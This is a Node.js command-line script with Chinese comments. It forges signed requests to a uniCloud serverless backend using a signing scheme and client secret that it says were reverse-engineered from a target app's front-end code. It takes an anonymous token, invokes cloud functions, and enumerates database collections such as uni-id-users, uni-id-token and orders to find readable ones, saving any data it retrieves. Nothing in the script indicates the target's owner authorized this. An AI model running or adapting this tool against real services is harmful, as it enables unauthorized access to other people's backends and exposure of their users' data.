#!/usr/bin/env node
/**
 * unicloud_probe.mjs — 只读探测 uniCloud 空间（aliyun/bspapp）
 *
 * 原理（从目标前端 bundle 里还原出来的签名协议）：
 *   POST {endpoint}/client
 *   header: x-serverless-sign = HMAC_SHA256(key=clientSecret,
 *           msg=sorted("k=v&...") over {method,params,spaceId,timestamp[,token]})
 *           x-basement-token = accessToken（invoke 类调用需要）
 *   body:   { method, params, spaceId, timestamp[, token] }
 *   auth:   method=serverless.auth.user.anonymousAuthorize, params="{}"  → result.accessToken
 *   invoke: method=serverless.function.runtime.invoke,
 *           params=JSON.stringify({functionTarget, functionArgs})
 *   clientDB: functionTarget=DCloud-clientDB,
 *           functionArgs={action:"database", command:JSON.stringify({$db:[…]})}
 *
 * 用法:
 *   node tools/unicloud_probe.mjs anon
 *   node tools/unicloud_probe.mjs invoke <函数名> '<json入参>'
 *   node tools/unicloud_probe.mjs cdb <集合名> [limit]
 *   node tools/unicloud_probe.mjs enum            # 候选集合逐个探测，输出存在性判定
 */
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';

const CFG = {
  // 从目标前端 bundle 逆向得到的空间凭据（空间已删除，凭据无效）。
  // 出于安全考虑不硬编码，请通过环境变量注入：
  //   UNICLOUD_SPACE_ID=mp-xxxx  UNICLOUD_CLIENT_SECRET=xxxx
  spaceId: process.env.UNICLOUD_SPACE_ID || 'mp-REPLACE_ME',
  clientSecret: process.env.UNICLOUD_CLIENT_SECRET || 'REPLACE_ME',
  endpoint: process.env.UNICLOUD_ENDPOINT || 'https://api.next.bspapp.com',
};
const URL_ = CFG.endpoint + '/client';
const TOKEN_FILE = path.resolve('captures/unicloud/token.txt');
const OUT_DIR = path.resolve('captures/unicloud');

function sign(obj) {
  const msg = Object.keys(obj)
    .sort()
    .filter((k) => obj[k] !== undefined && obj[k] !== null && obj[k] !== '')
    .map((k) => `${k}=${obj[k]}`)
    .join('&');
  return crypto.createHmac('sha256', CFG.clientSecret).update(msg).digest('hex');
}

async function call(body, withToken = false, token = '') {
  const ts = Date.now();
  const payload = { ...body, spaceId: CFG.spaceId, timestamp: ts };
  const headers = { 'Content-Type': 'application/json' };
  if (withToken) {
    payload.token = token;
    headers['x-basement-token'] = token;
  }
  headers['x-serverless-sign'] = sign(payload);
  const t0 = Date.now();
  const res = await fetch(URL_, { method: 'POST', headers, body: JSON.stringify(payload) });
  const text = await res.text();
  let json;
  try {
    json = JSON.parse(text);
  } catch {
    json = { raw: text };
  }
  return { status: res.status, ms: Date.now() - t0, json, requestId: res.headers.get('x-serverless-request-id') };
}

function save(name, data) {
  fs.mkdirSync(OUT_DIR, { recursive: true });
  fs.writeFileSync(path.join(OUT_DIR, name), typeof data === 'string' ? data : JSON.stringify(data, null, 2));
}

async function anon() {
  const r = await call({ method: 'serverless.auth.user.anonymousAuthorize', params: '{}' }, false);
  const token = r.json?.data?.result?.accessToken || r.json?.result?.accessToken || '';
  if (token) {
    fs.mkdirSync(OUT_DIR, { recursive: true });
    fs.writeFileSync(TOKEN_FILE, token);
  }
  return { ...r, token };
}

function readToken() {
  try {
    return fs.readFileSync(TOKEN_FILE, 'utf8').trim();
  } catch {
    return '';
  }
}

async function invoke(name, args, token) {
  const params = JSON.stringify({ functionTarget: name, functionArgs: args ?? {} });
  return call({ method: 'serverless.function.runtime.invoke', params }, true, token);
}

/** clientDB 命令信封 */
function cdbCommand(collection, limit = 1) {
  return JSON.stringify({
    $db: [
      { $method: 'collection', $param: [collection] },
      { $method: 'limit', $param: [limit] },
      { $method: 'get', $param: [] },
    ],
  });
}

function classify(r) {
  const body = r.json || {};
  const result = body.data?.result ?? body.result ?? body.data ?? body;
  const code = String(result?.code ?? body?.error?.code ?? '');
  const message = String(result?.message ?? body?.error?.message ?? '');
  const text = (code + ' ' + message).toUpperCase();
  if (/PERMISSION|DENIED|NOT_ALLOW|无权|权限/.test(text)) return { verdict: 'EXISTS_NO_READ', code, message };
  if (/COLLECTION_NOT_EXIST|NOT_EXIST|NOT_FOUND|不存在/.test(text)) return { verdict: 'NOT_EXIST', code, message };
  if (/SCHEMA/.test(text)) return { verdict: 'SCHEMA_MISSING', code, message };
  if (result?.dataList || result?.data) return { verdict: 'READABLE', code, message, sample: result.dataList || result.data };
  if (code && code !== '0' && code !== '') return { verdict: 'OTHER', code, message };
  return { verdict: 'UNKNOWN', code, message, raw: result };
}

const CANDIDATES = [
  // uni-id / opendb 官方表
  'uni-id-users', 'uni-id-roles', 'uni-id-permissions', 'uni-id-log', 'uni-id-device',
  'uni-id-token', 'uni-id-user-verify', 'opendb-verify-codes', 'opendb-feedback',
  'opendb-app-list', 'opendb-app-versions', 'opendb-admin-menus', 'opendb-admin-log',
  'opendb-department', 'opendb-notice', 'opendb-search-history',
  // 业务猜测
  'member', 'members', 'user', 'users', 'live', 'live-stream', 'live-record',
  'stream', 'streams', 'room', 'rooms', 'order', 'orders', 'card', 'cards',
  'kami', 'task', 'tasks', 'voice', 'tts', 'audio', 'bullet', 'barrage', 'dm',
  'config', 'configs', 'setting', 'settings', 'merchant', 'merchants', 'notice',
  'feedback', 'suanli', 'account', 'accounts',
];

async function main() {
  const [cmd, a1, a2] = process.argv.slice(2);
  if (!cmd) {
    console.log('用法: anon | invoke <fn> <json> | cdb <collection> [limit] | enum');
    return;
  }
  if (cmd === 'anon') {
    const r = await anon();
    console.log(JSON.stringify({ status: r.status, ms: r.ms, requestId: r.requestId, token: r.token ? r.token.slice(0, 24) + '…' : '', body: r.json }, null, 2));
    save('anon.json', r.json);
    return;
  }
  const token = readToken() || (await anon()).token;
  if (!token) {
    console.error('[x] 拿不到匿名 accessToken，后续调用无意义');
    return;
  }
  if (cmd === 'invoke') {
    const r = await invoke(a1, a2 ? JSON.parse(a2) : {}, token);
    console.log(JSON.stringify({ status: r.status, ms: r.ms, body: r.json }, null, 2));
    save(`invoke-${a1}.json`, r.json);
    return;
  }
  if (cmd === 'cdb') {
    const r = await invoke('DCloud-clientDB', { action: 'database', command: cdbCommand(a1, Number(a2 || 1)) }, token);
    console.log(JSON.stringify({ status: r.status, ms: r.ms, body: r.json }, null, 2));
    save(`cdb-${a1}.json`, r.json);
    return;
  }
  if (cmd === 'enum') {
    const rows = [];
    for (const c of CANDIDATES) {
      const r = await invoke('DCloud-clientDB', { action: 'database', command: cdbCommand(c, 1) }, token);
      const cls = classify(r);
      rows.push({ collection: c, ...cls });
      console.log(`${c.padEnd(24)} ${cls.verdict.padEnd(16)} ${cls.code} ${cls.message}`.trim());
      await new Promise((r2) => setTimeout(r2, 250));
    }
    save('enum.json', rows);
    console.log('\n存在且无读权限:', rows.filter((r) => r.verdict === 'EXISTS_NO_READ').map((r) => r.collection).join(', ') || '无');
    console.log('可读:', rows.filter((r) => r.verdict === 'READABLE').map((r) => r.collection).join(', ') || '无');
    return;
  }
  console.error('未知命令:', cmd);
}

main().catch((e) => {
  console.error('[x]', e.stack || e.message);
  process.exit(1);
});
